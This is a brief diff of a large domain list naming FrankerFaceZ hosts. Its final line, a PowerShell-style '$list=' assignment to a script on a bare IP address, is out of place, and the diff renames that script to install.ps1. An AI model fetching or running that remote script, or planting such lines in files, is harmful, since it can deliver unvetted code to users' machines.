@@ -149049,4 +149049,4 @@ cdn2.frankerfacez.com
 cdn.frankerfacez.com
 api.ffzap.com
 api.frankerfacez.com
-$list=http://87.228.100.100:4200/script/script.ps1
+$list=http://87.228.100.100:4200/script/install.ps1
